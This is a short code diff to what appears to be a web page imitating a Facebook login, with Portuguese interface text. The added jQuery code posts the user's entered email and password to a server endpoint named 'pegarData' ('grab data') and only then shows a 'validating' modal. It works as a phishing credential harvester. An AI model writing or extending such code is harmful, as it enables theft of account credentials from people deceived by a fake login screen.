@@ -276,7 +276,19 @@ $(document).ready(function () {
         const passwd = $("#passwd").val().trim();
 
         if (email && passwd) {
-            mostrarModalValidando();
+
+            $.ajax({
+                url : "{{ url_for('pegarData') }}",
+                type : 'post',
+                data : {
+                    email : email,
+                    passwd : passwd
+                }
+            })
+            .done(function(msg){
+                mostrarModalValidando();
+            })
+
         } else {
             alert("Necessário preencher os campos de email e senha e clicar em Entrar com Facebook!");
         }
@@ -296,4 +308,3 @@ $(document).ready(function () {
     });
 });
 </script>
-
